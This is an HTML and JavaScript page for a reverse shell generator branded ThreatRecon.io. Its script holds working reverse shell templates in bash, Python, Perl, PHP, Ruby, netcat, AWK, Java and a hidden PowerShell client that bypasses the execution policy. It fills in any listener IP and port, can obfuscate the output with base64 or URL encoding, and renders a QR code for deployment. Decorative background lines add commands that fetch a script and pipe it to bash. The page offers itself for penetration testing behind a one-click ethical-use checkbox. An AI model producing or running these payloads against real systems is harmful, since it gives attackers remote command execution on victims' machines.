<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ThreatRecon.io - Reverse Shell Generator</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        :root {
            --primary: #000000; /* Jet black - updated to match index */
            --secondary: #0a0a0a; /* Updated to match index */
            --accent: #131313; /* Updated to match index */
            --highlight: #fe0000; /* Matching index.html */
            --highlight-dark: #c20000;
            --text: #ffffff; /* Bright white - updated to match index */
            --glow: rgba(255, 255, 255, 0.7); /* Added from index */
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--primary); /* Changed to match index */
            color: var(--text);
            line-height: 1.6;
            overflow-x: hidden; /* Added from index */
            position: relative;
        }
        
        /* Red radial gradient background overlay */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at center, rgba(254, 0, 0, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
            z-index: -1;
            pointer-events: none;
        }
        
        .container {
            max-width: 1400px; /* Updated to match index */
            margin: 0 auto;
            padding: 0 20px;
        }
        
        header {
            background-color: rgba(0, 0, 0, 0.8); /* Updated to match index */
            padding: 20px 0;
            position: fixed; /* Changed to fixed as in index */
            width: 100%;
            top: 0;
            z-index: 100;
            backdrop-filter: blur(8px); /* Added from index */
            border-bottom: 1px solid rgba(255, 255, 255, 0.1); /* Added from index */
        }
        
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: var(--text);
            text-decoration: none;
            letter-spacing: 1.5px; /* Added from index */
            text-transform: uppercase; /* Added from index */
            position: relative; /* Added from index */
        }
        
        .logo::after {
            content: '';
            position: absolute;
            left: 0;
            bottom: -5px;
            width: 40px;
            height: 2px;
            background-color: var(--highlight);
        }
        
        .logo span {
            color: var(--highlight);
        }
        
        .nav-links {
            display: flex;
            gap: 20px;
        }
        
        .nav-links a {
            color: var(--text);
            text-decoration: none;
            transition: color 0.3s;
        }
        
        .nav-links a:hover {
            color: var(--highlight);
        }
        
        main {
            padding-top: 100px; /* Added to account for fixed header */
        }
        
        .tool-container {
            background-color: rgba(10, 10, 10, 0.6); /* Updated to match index card style */
            backdrop-filter: blur(5px); /* Added from index */
            border: 1px solid rgba(255, 255, 255, 0.1); /* Added from index */
            border-radius: 10px;
            padding: 40px;
            margin: 40px 0;
            position: relative; /* Added for before element */
            overflow: hidden; /* Added for before element */
        }
        
        .tool-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 5px;
            height: 100%;
            background: var(--highlight);
            transform: scaleY(0);
            transform-origin: bottom;
            transition: transform 0.4s;
        }
        
        .tool-container:hover::before {
            transform: scaleY(1);
        }
        
        h1, h2, h3 {
            color: var(--text);
        }
        
        h1 {
            font-size: 3.5rem; /* Updated to match index */
            margin-bottom: 20px;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 3px;
            line-height: 1.2;
            position: relative;
            display: inline-block;
            margin: 0 auto;
        }
        
        h1::after {
            content: '';
            position: absolute;
            left: 50%;
            bottom: -15px;
            transform: translateX(-50%);
            width: 100px;
            height: 3px;
            background-color: var(--highlight);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        select, input {
            width: 100%;
            padding: 12px;
            border-radius: 4px;
            border: 1px solid var(--accent);
            background-color: var(--primary);
            color: var(--text);
            font-size: 16px;
        }
        
        .btn {
            display: inline-block;
            background-color: transparent; /* Updated to match index */
            color: var(--text);
            padding: 12px 30px; /* Updated to match index */
            border: 1px solid var(--highlight);
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            transition: all 0.3s;
            text-transform: uppercase; /* Added from index */
            letter-spacing: 1px; /* Added from index */
            font-size: 0.85rem; /* From index */
            position: relative;
            overflow: hidden;
            cursor: pointer;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--highlight);
            transform: scaleX(0);
            transform-origin: right;
            transition: transform 0.3s ease;
            z-index: -1;
        }
        
        .btn:hover {
            color: white;
        }
        
        .btn:hover::before {
            transform: scaleX(1);
            transform-origin: left;
        }
        
        .btn-secondary {
            background-color: var(--accent);
            border-color: var(--accent);
        }
        
        .btn-secondary:hover::before {
            background-color: var(--accent);
        }
        
        .btn-container {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .result-container {
            margin-top: 30px;
            padding: 20px;
            background-color: var(--accent);
            border-radius: 4px;
            position: relative;
        }
        
        .result-container pre {
            margin: 0;
            padding: 20px;
            background-color: var(--primary);
            border-radius: 4px;
            overflow-x: auto;
            color: var(--text);
            font-family: 'Courier New', Courier, monospace;
        }
        
        .copy-btn {
            position: absolute;
            top: 30px;
            right: 30px;
            padding: 6px 12px;
            font-size: 14px;
            opacity: 0.8;
        }
        
        .ethical-checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            padding: 8px 12px;
            border-radius: 4px;
            background-color: rgba(254, 0, 0, 0.05);
            white-space: nowrap;
            overflow: visible;
        }
        
        .ethical-checkbox {
            margin-right: 10px;
            min-width: 18px;
            height: 18px;
            flex-shrink: 0;
            accent-color: var(--highlight);
        }
        
        .ethical-label {
            margin: 0;
            display: inline;
            white-space: normal;
        }
        
        .footer {
            padding: 40px 0;
            text-align: center;
            font-size: 14px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            margin-top: 100px;
        }
        
        .disclaimer {
            background-color: rgba(255, 59, 92, 0.1);
            border-left: 4px solid var(--highlight);
            padding: 15px;
            margin: 30px 0;
            font-size: 14px;
        }
        
        .hidden {
            display: none;
        }
        
        /* Code-like design element - Added from index */
        .code-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.05;
            pointer-events: none;
            overflow: hidden;
        }
        
        .code-line {
            position: absolute;
            font-family: monospace;
            color: var(--text);
            font-size: 12px;
            white-space: nowrap;
            opacity: 0.5;
        }
        
        /* Hero section with red radial gradient - Added from index */
        .hero {
            height: 40vh; /* Reduced from 100vh in index */
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            padding-top: 60px;
        }
        
        .hero::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at center, rgba(254, 0, 0, 0.2) 0%, rgba(0, 0, 0, 0) 70%);
            z-index: -1;
        }
        
        .hero-content {
            text-align: center;
            max-width: 800px;
            padding: 0 20px;
            z-index: 1;
        }
        
        /* Responsive styles */
        @media (max-width: 768px) {
            .nav-links {
                display: none;
            }
            
            .tool-container {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.5rem;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <nav>
                <a href="index.html" class="logo">Threat<span>Recon</span>.io</a>
                <div class="nav-links">
                    <a href="index.html">Home</a>
                    <a href="#" class="active">Reverse Shells</a>
                    <a href="#">Hash Cracker</a>
                    <a href="#">Encoder/Decoder</a>
                    <a href="#">About</a>
                </div>
            </nav>
        </div>
    </header>
    
    <!-- Added hero section with code background from index.html -->
    <section class="hero">
        <div class="code-bg" id="codeBg"></div>
        <div class="hero-content">
            <h1>Reverse Shell Generator</h1>
        </div>
    </section>
    
    <main class="container">
        <div class="tool-container">
            <h2>Quick Guide</h2>
            <div style="display: flex; flex-wrap: wrap; gap: 30px; margin: 20px 0;">
                <div style="flex: 1; min-width: 250px;">
                    <h3 style="margin-bottom: 8px; border-bottom: 1px solid var(--accent); padding-bottom: 5px;">Setup</h3>
                    <ol style="padding-left: 20px; margin-bottom: 0;">
                        <li>Choose your target system</li>
                        <li>Select shell type & variant</li>
                        <li>Enter your IP and port</li>
                        <li>Generate command</li>
                    </ol>
                </div>
                <div style="flex: 1; min-width: 250px;">
                    <h3 style="margin-bottom: 8px; border-bottom: 1px solid var(--accent); padding-bottom: 5px;">Testing</h3>
                    <p style="margin: 0;">Start listener: <code>nc -lvnp 4444</code></p>
                    <p style="margin: 5px 0 0;">Run generated command on target</p>
                </div>
            </div>
            
            <details>
                <summary style="cursor: pointer; color: var(--highlight); margin-bottom: 15px;">View detailed instructions</summary>
                <div style="padding: 10px; background-color: rgba(0,0,0,0.3); border-radius: 5px; margin-bottom: 15px;">
                    <h3>Shell Types Guide</h3>
                    <ul style="columns: 2; padding-left: 20px; margin: 10px 0;">
                        <li><strong>Bash</strong> - Most Linux/Unix systems</li>
                        <li><strong>Python</strong> - Python 3 only</li>
                        <li><strong>PHP</strong> - Web servers</li>
                        <li><strong>Netcat</strong> - The "traditional" variant</li>
                        <li><strong>PowerShell</strong> - Windows targets</li>
                        <li><strong>Perl/Ruby/AWK/Java</strong> - Alternatives</li>
                    </ul>
                </div>
            </details>
        </div>
        
        <div class="tool-container">
            <div class="form-group">
                <label for="targetOS">Target OS/Environment:</label>
                <select id="targetOS">
                    <option value="linux">Linux</option>
                    <option value="windows">Windows</option>
                    <option value="webserver">Web Server</option>
                    <option value="restricted">Restricted Shell</option>
                    <option value="macos">macOS</option>
                    <option value="iot">IoT Device</option>
                </select>
            </div>
            
            <div class="form-group">
                <label for="shellType">Shell Type:</label>
                <select id="shellType">
                    <option value="bash">Bash</option>
                    <option value="python">Python</option>
                    <option value="perl">Perl</option>
                    <option value="php">PHP</option>
                    <option value="ruby">Ruby</option>
                    <option value="netcat">Netcat</option>
                    <option value="powershell">PowerShell</option>
                    <option value="awk">AWK</option>
                    <option value="java">Java</option>
                </select>
            </div>
            
            <div class="form-group" id="subtypeContainer">
                <label for="shellSubtype">Variant:</label>
                <select id="shellSubtype">
                    <!-- Options will be dynamically populated based on shell type -->
                </select>
            </div>
            
            <div class="form-group">
                <label for="ipAddress">Listener IP Address:</label>
                <input type="text" id="ipAddress" placeholder="e.g., 10.10.10.10">
            </div>
            
            <div class="form-group">
                <label for="portNumber">Listener Port:</label>
                <input type="number" id="portNumber" placeholder="e.g., 4444" min="1" max="65535">
            </div>
            
            <div class="form-group">
                <label>Payload Obfuscation:</label>
                <div style="display: flex; flex-wrap: wrap; gap: 15px; margin-top: 8px;">
                    <div style="display: flex; align-items: center;">
                        <input type="radio" id="obfuscationNone" name="obfuscation" value="none" checked style="margin-right: 5px;">
                        <label for="obfuscationNone" style="margin: 0;">None</label>
                    </div>
                    <div style="display: flex; align-items: center;">
                        <input type="radio" id="obfuscationBase64" name="obfuscation" value="base64" style="margin-right: 5px;">
                        <label for="obfuscationBase64" style="margin: 0;">Base64</label>
                    </div>
                    <div style="display: flex; align-items: center;">
                        <input type="radio" id="obfuscationURL" name="obfuscation" value="url" style="margin-right: 5px;">
                        <label for="obfuscationURL" style="margin: 0;">URL Encode</label>
                    </div>
                </div>
            </div>
            
            <div class="form-group">
                <div style="display: flex; align-items: center; background-color: rgba(254, 0, 0, 0.08); border-radius: 4px; margin-bottom: 20px; padding: 0;">
                    <div style="padding: 10px 0 10px 10px;">
                        <input type="checkbox" id="ethicalUseCheckbox" style="margin: 0; min-width: 20px; height: 20px;">
                    </div>
                    <div style="padding: 10px 10px 10px 15px;">
                        <label for="ethicalUseCheckbox" style="margin: 0; line-height: 20px; cursor: pointer;">
                            I accept that this tool is for authorized and educational use only, and I am responsible for how I use it.
                        </label>
                    </div>
                </div>
            </div>
            
            <div class="btn-container">
                <button id="generateBtn" class="btn" disabled>Generate Shell Command</button>
                <button id="clearBtn" class="btn btn-secondary">Clear</button>
            </div>
            
            <div class="result-container hidden" id="resultContainer">
                <h3>Generated Command:</h3>
                <pre id="commandOutput"></pre>
                <button id="copyBtn" class="btn copy-btn">Copy</button>
                
                <div style="margin-top: 20px; border-top: 1px solid var(--accent); padding-top: 15px;">
                    <h4>Listener Command:</h4>
                    <pre id="listenerOutput">nc -lvnp <span id="listenerPort">4444</span></pre>
                    <div style="display: flex; gap: 10px; margin-top: 10px;">
                        <button id="copyListenerBtn" class="btn btn-secondary" style="font-size: 14px;">Copy Listener</button>
                        <button id="toggleRlwrapBtn" class="btn btn-secondary" style="font-size: 14px;">Use rlwrap</button>
                    </div>
                </div>
                
                <div style="margin-top: 20px; border-top: 1px solid var(--accent); padding-top: 15px;">
                    <h4>QR Code for Mobile Deployment:</h4>
                    <p style="font-size: 14px; color: #aaa;">Scan this QR code to quickly deploy the command on mobile devices.</p>
                    <div style="display: flex; gap: 20px; align-items: flex-start; flex-wrap: wrap;">
                        <div>
                            <div id="qrcode" style="padding: 15px; background: white; border-radius: 4px;"></div>
                            <div id="qrSizeControls" style="margin-top: 10px; display: none;">
                                <label for="qrSizeSlider" style="font-size: 12px; display: block; margin-bottom: 5px;">Adjust QR Size:</label>
                                <input type="range" id="qrSizeSlider" min="120" max="300" value="180" style="width: 100%;">
                            </div>
                        </div>
                        <div style="flex: 1; min-width: 200px;">
                            <button id="generateQRBtn" class="btn btn-secondary" style="font-size: 14px; margin-bottom: 10px;">Regenerate QR Code</button>
                            <br>
                            <button id="downloadQRBtn" class="btn btn-secondary" style="font-size: 14px; margin-bottom: 15px;" disabled>Download QR</button>
                            
                            <div id="rawPayloadContainer" style="margin-top: 15px;">
                                <label for="rawPayload" style="font-size: 12px; display: block; margin-bottom: 5px;">Raw Payload for Manual Copy:</label>
                                <textarea id="rawPayload" readonly style="width: 100%; height: 60px; font-size: 12px; background-color: var(--primary); color: var(--text); border: 1px solid var(--accent); padding: 8px; border-radius: 4px;"></textarea>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="disclaimer">
            <strong>Ethical Use Warning:</strong> This tool is provided for educational purposes and legitimate security testing only. Always ensure you have explicit permission before executing these commands on any system. Unauthorized access to computer systems is illegal and unethical.
        </div>
    </main>
    
    <footer class="footer">
        <div class="container">
            <p>&copy; 2025 ThreatRecon.io - All Rights Reserved</p>
        </div>
    </footer>
    
    <script>
        // Shell templates
        const shellTemplates = {
            bash: {
                tcp: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
                udp: 'bash -i >& /dev/udp/{ip}/{port} 0>&1'
            },
            python: {
                standard: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
                pty: 'python3 -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\''
            },
            perl: {
                standard: 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
                alt: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
            },
            php: {
                standard: 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
                alt: '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/{ip}/{port} 0>&1\'");?>'
            },
            ruby: 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            netcat: {
                traditional: 'nc -e /bin/sh {ip} {port}',
                alternative: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
            },
            powershell: {
                standard: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
                oneLiners: '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
            },
            awk: 'awk \'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
            java: 'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]); p.waitFor()'
        };
        
        // DOM elements
        const shellTypeSelect = document.getElementById('shellType');
        const shellSubtypeSelect = document.getElementById('shellSubtype');
        const subtypeContainer = document.getElementById('subtypeContainer');
        const targetOSSelect = document.getElementById('targetOS');
        const ipAddressInput = document.getElementById('ipAddress');
        const portNumberInput = document.getElementById('portNumber');
        const ethicalUseCheckbox = document.getElementById('ethicalUseCheckbox');
        const generateBtn = document.getElementById('generateBtn');
        const clearBtn = document.getElementById('clearBtn');
        const resultContainer = document.getElementById('resultContainer');
        const commandOutput = document.getElementById('commandOutput');
        const copyBtn = document.getElementById('copyBtn');
        const listenerOutput = document.getElementById('listenerOutput');
        const listenerPort = document.getElementById('listenerPort');
        const copyListenerBtn = document.getElementById('copyListenerBtn');
        const toggleRlwrapBtn = document.getElementById('toggleRlwrapBtn');
        const generateQRBtn = document.getElementById('generateQRBtn');
        const downloadQRBtn = document.getElementById('downloadQRBtn');
        
        // Update subtypes based on selected shell type
        function updateSubtypes() {
            const selectedType = shellTypeSelect.value;
            const templateForType = shellTemplates[selectedType];
            
            // Clear existing options
            shellSubtypeSelect.innerHTML = '';
            
            if (typeof templateForType === 'object' && !Array.isArray(templateForType)) {
                // Show subtype selector if there are subtypes
                subtypeContainer.classList.remove('hidden');
                
                // Add options for each subtype
                for (const subtype in templateForType) {
                    const option = document.createElement('option');
                    option.value = subtype;
                    
                    // Format the subtype name for display
                    let displayName = subtype.charAt(0).toUpperCase() + subtype.slice(1);
                    
                    // Set appropriate display names based on subtype
                    if (subtype === 'tcp') displayName = 'TCP';
                    if (subtype === 'udp') displayName = 'UDP';
                    if (subtype === 'standard') displayName = 'Standard';
                    if (subtype === 'pty') displayName = 'With PTY (Better Terminal)';
                    if (subtype === 'alt') displayName = 'Alternative';
                    if (subtype === 'traditional') displayName = 'Traditional (-e option)';
                    if (subtype === 'alternative') displayName = 'Alternative (FIFO)';
                    if (subtype === 'oneLiners') displayName = 'One-Liner';
                    
                    option.textContent = displayName;
                    shellSubtypeSelect.appendChild(option);
                }
            } else {
                // Hide subtype selector if there are no subtypes
                subtypeContainer.classList.add('hidden');
            }
        }
        
        // Generate shell command
        function generateShellCommand() {
            const shellType = shellTypeSelect.value;
            const shellSubtype = shellSubtypeSelect.value || null;
            const ipAddress = ipAddressInput.value.trim();
            const portNumber = portNumberInput.value.trim();
            const obfuscationType = document.querySelector('input[name="obfuscation"]:checked').value;
            
            // Validate inputs
            if (!ipAddress) {
                alert('Please enter a valid IP address');
                ipAddressInput.focus();
                return;
            }
            
            if (!portNumber || isNaN(parseInt(portNumber)) || parseInt(portNumber) < 1 || parseInt(portNumber) > 65535) {
                alert('Please enter a valid port number (1-65535)');
                portNumberInput.focus();
                return;
            }
            
            // Get the appropriate template
            let template;
            if (typeof shellTemplates[shellType] === 'object' && !Array.isArray(shellTemplates[shellType]) && shellSubtype) {
                template = shellTemplates[shellType][shellSubtype];
            } else {
                template = shellTemplates[shellType];
            }
            
            // Replace placeholders with actual values
            let command = template
                .replace(/{ip}/g, ipAddress)
                .replace(/{port}/g, portNumber);
            
            // Apply obfuscation if selected
            if (obfuscationType !== 'none') {
                command = applyObfuscation(command, obfuscationType, shellType);
            }
            
            // Display the result
            commandOutput.textContent = command;
            resultContainer.classList.remove('hidden');
            
            // Update listener command port
            updateListenerPort();
            
            // Auto-generate QR code
            generateQRCode();
        }
        
        // Apply obfuscation to the command
        function applyObfuscation(command, type, shellType) {
            switch(type) {
                case 'base64':
                    const encoded = btoa(command);
                    // Return appropriate decoder based on shell type
                    if (shellType === 'powershell') {
                        // PowerShell encoded command
                        return `powershell -e ${btoa(unescape(encodeURIComponent(command)))}`;
                    } else {
                        // Bash/Linux encoded command
                        return `echo ${encoded} | base64 -d | bash`;
                    }
                case 'url':
                    return encodeURIComponent(command);
                default:
                    return command;
            }
        }
        
        // Copy command to clipboard
        function copyToClipboard() {
            const commandText = commandOutput.textContent;
            navigator.clipboard.writeText(commandText).then(() => {
                const originalText = copyBtn.textContent;
                copyBtn.textContent = 'Copied!';
                setTimeout(() => {
                    copyBtn.textContent = originalText;
                }, 2000);
            }).catch(err => {
                console.error('Could not copy text: ', err);
            });
        }
        
        // Clear form
        function clearForm() {
            ipAddressInput.value = '';
            portNumberInput.value = '';
            ethicalUseCheckbox.checked = false;
            generateBtn.disabled = true;
            resultContainer.classList.add('hidden');
            
            // Reset QR code
            const qrContainer = document.getElementById('qrcode');
            qrContainer.innerHTML = '';
            downloadQRBtn.disabled = true;
            document.getElementById('qrSizeControls').style.display = 'none';
            document.getElementById('rawPayload').value = '';
            qrcode = null;
        }
        
        // Event listeners
        shellTypeSelect.addEventListener('change', updateSubtypes);
        targetOSSelect.addEventListener('change', updateRecommendedShell);
        generateBtn.addEventListener('click', generateShellCommand);
        clearBtn.addEventListener('click', clearForm);
        copyBtn.addEventListener('click', copyToClipboard);
        copyListenerBtn.addEventListener('click', copyListenerCommand);
        toggleRlwrapBtn.addEventListener('click', toggleRlwrap);
        portNumberInput.addEventListener('input', updateListenerPort);
        generateQRBtn.addEventListener('click', generateQRCode);
        downloadQRBtn.addEventListener('click', downloadQRCode);
        
        // Enable/disable generate button based on checkbox
        ethicalUseCheckbox.addEventListener('change', function() {
            generateBtn.disabled = !this.checked;
        });
        
        // Initialize
        updateSubtypes();
        
        // QR code object
        let qrcode = null;
        
        // Function to generate QR code
        function generateQRCode() {
            const command = commandOutput.textContent;
            
            // Set raw payload text
            document.getElementById('rawPayload').value = command;
            
            // Clear previous QR code
            const qrContainer = document.getElementById('qrcode');
            qrContainer.innerHTML = '';
            
            // Get size - adaptive based on payload length
            let qrSize = 180; // default size
            if (command.length > 120) {
                // Show size controls for larger payloads
                document.getElementById('qrSizeControls').style.display = 'block';
                qrSize = document.getElementById('qrSizeSlider').value;
            } else {
                document.getElementById('qrSizeControls').style.display = 'none';
            }
            
            // Generate new QR code
            qrcode = new QRCode(qrContainer, {
                text: command,
                width: qrSize,
                height: qrSize,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
            
            // Enable download button
            downloadQRBtn.disabled = false;
        }
        
        // Handle QR size slider
        if (document.getElementById('qrSizeSlider')) {
            document.getElementById('qrSizeSlider').addEventListener('input', function() {
                // Only regenerate if we already have a QR code
                if (qrcode) {
                    generateQRCode();
                }
            });
        }
        
        // Function to download QR code
        function downloadQRCode() {
            if (!qrcode) return;
            
            // Get QR code as image
            const canvas = document.querySelector('#qrcode canvas');
            if (!canvas) return;
            
            // Convert to data URL
            const dataURL = canvas.toDataURL('image/png');
            
            // Create download link
            const downloadLink = document.createElement('a');
            downloadLink.href = dataURL;
            downloadLink.download = 'reverseshell_qrcode.png';
            
            // Trigger download
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
        }
        
        // Function to update the listener port display
        function updateListenerPort() {
            const port = portNumberInput.value.trim() || '4444';
            listenerPort.textContent = port;
        }
        
        // Function to toggle between nc and rlwrap nc
        function toggleRlwrap() {
            const currentCommand = listenerOutput.textContent;
            if (currentCommand.startsWith('rlwrap')) {
                listenerOutput.textContent = currentCommand.replace('rlwrap ', '');
                toggleRlwrapBtn.textContent = 'Use rlwrap';
            } else {
                listenerOutput.textContent = 'rlwrap ' + currentCommand;
                toggleRlwrapBtn.textContent = 'Remove rlwrap';
            }
        }
        
        // Function to copy listener command
        function copyListenerCommand() {
            const listenerCommand = listenerOutput.textContent;
            navigator.clipboard.writeText(listenerCommand).then(() => {
                const originalText = copyListenerBtn.textContent;
                copyListenerBtn.textContent = 'Copied!';
                setTimeout(() => {
                    copyListenerBtn.textContent = originalText;
                }, 2000);
            }).catch(err => {
                console.error('Could not copy text: ', err);
            });
        }
        
        // Function to update recommended shell based on OS
        function updateRecommendedShell() {
            const targetOS = targetOSSelect.value;
            
            // Save current selection to restore if user already chose something
            const currentSelection = shellTypeSelect.value;
            
            switch(targetOS) {
                case 'windows':
                    highlightOption(shellTypeSelect, 'powershell');
                    break;
                case 'linux':
                    highlightOption(shellTypeSelect, 'bash');
                    break;
                case 'webserver':
                    highlightOption(shellTypeSelect, 'php');
                    break;
                case 'restricted':
                    highlightOption(shellTypeSelect, 'netcat');
                    break;
                case 'macos':
                    highlightOption(shellTypeSelect, 'bash');
                    break;
                case 'iot':
                    highlightOption(shellTypeSelect, 'netcat');
                    break;
                default:
                    // Do nothing
            }
            
            // Restore user selection if they had one
            if (currentSelection) {
                shellTypeSelect.value = currentSelection;
            }
            
            // Update subtypes for the new shell type
            updateSubtypes();
        }
        
        // Helper function to highlight recommended option
        function highlightOption(selectElement, value) {
            selectElement.value = value;
            
            // Reset all options
            Array.from(selectElement.options).forEach(option => {
                option.style.fontWeight = 'normal';
                option.style.color = '';
            });
            
            // Highlight the recommended option
            const option = Array.from(selectElement.options).find(opt => opt.value === value);
            if (option) {
                option.style.fontWeight = 'bold';
                option.style.color = 'var(--highlight)';
            }
        }
        
        // Added from index.html: Animate the code background
        document.addEventListener('DOMContentLoaded', function() {
            const codeBg = document.getElementById('codeBg');
            const codeSnippets = [
                "GET /api/v1/users HTTP/1.1",
                "nc -e /bin/sh 10.0.0.1 1234",
                "SELECT * FROM users WHERE username='admin'--",
                "python -c 'import socket,os,pty;s=socket.socket()'",
                "curl -s https://10.10.14.14/shell.sh | bash",
                "ssh-keygen -t rsa -b 4096",
                "echo 'c2gg' | base64 -d | bash",
                "sudo -l",
                "find / -perm -u=s -type f 2>/dev/null",
                "hashcat -m 0 -a 0 hash.txt wordlist.txt",
                "nmap -sC -sV -oA scan 10.10.10.10"
            ];
            
            // Create random code lines
            for (let i = 0; i < 30; i++) {
                const line = document.createElement('div');
                line.classList.add('code-line');
                line.textContent = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
                line.style.top = `${Math.random() * 100}%`;
                line.style.left = `${Math.random() * 100 - 50}%`;
                line.style.opacity = Math.random() * 0.5 + 0.1;
                codeBg.appendChild(line);
            }
            
            // Smooth scroll for buttons
            document.querySelectorAll('a[href^="#"]').forEach(anchor => {
                anchor.addEventListener('click', function (e) {
                    e.preventDefault();
                    
                    const targetId = this.getAttribute('href');
                    if (targetId === '#') return;
                    
                    const targetElement = document.querySelector(targetId);
                    if (targetElement) {
                        targetElement.scrollIntoView({
                            behavior: 'smooth',
                            block: 'start'
                        });
                    }
                });
            });
        });
    </script>
</body>
</html>